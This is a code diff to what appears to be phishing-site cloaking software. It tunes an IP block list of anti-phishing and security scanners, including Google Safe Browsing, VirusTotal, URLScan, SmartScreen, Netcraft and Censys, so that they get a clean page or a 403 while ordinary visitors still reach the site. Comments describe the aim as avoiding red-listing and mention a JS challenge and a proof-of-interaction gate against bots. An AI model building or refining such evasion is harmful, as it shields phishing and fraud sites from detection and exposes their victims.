@@ -31,17 +31,21 @@ const whmApi = WHM_HOST && WHM_TOKEN ? axios.create({
 // These crawlers flag/red-list websites. Cloaking = returning clean page or 403 to them.
 
 const SCANNER_IP_RANGES = [
-  // ─── Anti-Phishing / Safe Browsing Crawlers ───
-  // Google Safe Browsing / Transparency Report crawlers
-  '66.249.64.0/19',
-  '66.249.79.0/24',
-  '72.14.199.0/24',
-  '209.85.238.0/24',
-  '216.239.32.0/19',
-  '74.125.0.0/16',
-  // Google fetch-as (used by manual SB review)
-  '64.233.160.0/19',
-  '108.177.0.0/17',
+  // ═══════════════════════════════════════════════════════════════════════
+  // ONLY specific, known scanner tool IPs. NO cloud infrastructure ranges.
+  // Cloud ranges (GCP, AWS, Azure) were removed — they blocked millions of
+  // legitimate users (mobile carriers, ISPs, VPNs sharing cloud IP space).
+  // The JS challenge + UA detection + proof-of-interaction button catch bots
+  // regardless of their source IP.
+  // ═══════════════════════════════════════════════════════════════════════
+
+  // ─── Anti-Phishing / Safe Browsing Crawlers (specific crawler IPs only) ───
+  '66.249.64.0/19',     // Googlebot (dedicated crawler range)
+  '66.249.79.0/24',     // Googlebot
+  '72.14.199.0/24',     // Google Safe Browsing crawler
+  '209.85.238.0/24',    // Google Safe Browsing crawler
+  '216.239.32.0/19',    // Google infrastructure (crawlers)
+
   // VirusTotal scanners
   '208.100.26.228',
   '5.189.183.72',
@@ -58,20 +62,17 @@ const SCANNER_IP_RANGES = [
   '77.88.55.0/24',
   '87.250.250.0/24',
   '93.158.161.0/24',
-  // URLScan.io
+  // URLScan.io (specific /24s only)
   '18.213.240.0/24',
   '3.220.57.0/24',
-  // Microsoft SmartScreen / Defender
+  // Microsoft SmartScreen (specific /24s only — removed broad 52.96.0.0/14)
   '13.107.21.0/24',
   '204.79.197.0/24',
-  '52.96.0.0/14',
-  // Netcraft (expanded — they use multiple ranges for phishing verification)
+  // Netcraft
   '194.72.238.0/24',
-  '194.72.0.0/16',
   '195.22.26.0/24',
   '46.183.103.0/24',
   '185.117.215.0/24',
-  '82.69.0.0/16',
   // Kaspersky
   '77.74.181.0/24',
   '93.159.230.0/24',
@@ -86,7 +87,8 @@ const SCANNER_IP_RANGES = [
   '208.91.112.0/20',
   // Comodo (Sectigo)
   '178.255.82.0/24',
-  // ─── Port / Recon Scanners ───
+
+  // ─── Port / Recon Scanners (dedicated scanner infrastructure) ───
   // Censys
   '162.142.125.0/24',
   '167.94.138.0/24',
@@ -105,62 +107,20 @@ const SCANNER_IP_RANGES = [
   '198.20.70.0/24',
   '198.20.87.0/24',
   '198.20.99.0/24',
-  // ZoomEye
-  '106.75.64.0/18',
-  '106.11.248.0/22',
   // Qualys
   '64.39.96.0/20',
   // Rapid7
   '71.6.233.0/24',
   // GreyNoise
   '71.6.199.0/24',
-  // Binaryedge
-  '149.102.128.0/18',
   // Internet Census
   '74.82.47.0/24',
-  // SecurityTrails
-  '52.86.0.0/16',
   // SSL Labs
   '64.41.200.0/24',
-  // DNSstuff
-  '216.52.0.0/16',
-  // ─── Google Infrastructure (specific Safe Browsing / crawl ranges only) ───
-  // REMOVED: '34.0.0.0/9' — far too broad (8.4M IPs), blocked mobile carriers & legit users
-  '35.184.0.0/13',      // Google Cloud (35.184–35.191) — known SB crawler range
-  '35.192.0.0/12',      // Google Cloud (35.192–35.207)
-  '35.208.0.0/12',      // Google Cloud (35.208–35.223)
-  '35.224.0.0/12',      // Google Cloud (35.224–35.239)
-  '35.240.0.0/13',      // Google Cloud (35.240–35.247)
-  '130.211.0.0/22',     // Google Cloud Load Balancers
-  '142.250.0.0/15',     // Google infrastructure (142.250–142.251)
-  '142.251.0.0/16',     // Google infrastructure
-  '172.217.0.0/16',     // Google services
-  '172.253.0.0/16',     // Google services
-  '173.194.0.0/16',     // Google services
-  '209.85.128.0/17',    // Google mail/services
-  '8.8.4.0/24',         // Google Public DNS (used by some scanners)
-  '8.8.8.0/24',         // Google Public DNS
-  '8.34.208.0/20',      // Google Cloud
-  '8.35.192.0/20',      // Google Cloud
-  '23.236.48.0/20',     // Google Cloud
-  '23.251.128.0/19',    // Google Cloud
-  '104.154.0.0/15',     // Google Cloud (104.154–104.155)
-  '104.196.0.0/14',     // Google Cloud (104.196–104.199)
-  '107.167.160.0/19',   // Google Cloud
-  '107.178.192.0/18',   // Google Cloud
-  '146.148.0.0/17',     // Google Cloud
-  '199.192.112.0/22',   // Google Cloud
-  '199.223.232.0/21',   // Google Cloud
-  // ─── AWS (specific known-scanner ranges only) ───
-  // REMOVED: '3.0.0.0/9', '18.0.0.0/8', '52.0.0.0/10', '54.64.0.0/11'
-  // Those /8–/11 ranges blocked millions of legitimate IPs (mobile carriers, ISPs sharing AWS space)
-  // Specific scanner IPs (URLScan, SecurityTrails) are already listed above individually
-  // ─── Azure (specific scanner ranges only) ───
-  // REMOVED: '13.64.0.0/11', '40.74.0.0/15', '40.112.0.0/13', '52.96.0.0/12', '168.63.0.0/16'
-  // Those broad ranges blocked legitimate Azure-hosted services and O365 users
-  '20.33.0.0/16',       // Azure Front Door (scanning infrastructure)
-  // NOTE: Do NOT block Cloudflare proxy IPs (173.245.48.0/20, 103.21.244.0/22, 103.22.200.0/22)
-  // When sites are behind CF, ALL traffic comes through these IPs — blocking them = blocking everyone
+
+  // NOTE: Do NOT block Cloudflare proxy IPs — blocking them = blocking everyone
+  // NOTE: ALL cloud infra ranges (GCP, AWS, Azure) intentionally removed.
+  // Scanner UAs + JS challenge + proof-of-interaction are sufficient.
 ]
 
 // Known bot user agents used by security scanners (anti-phishing + recon)
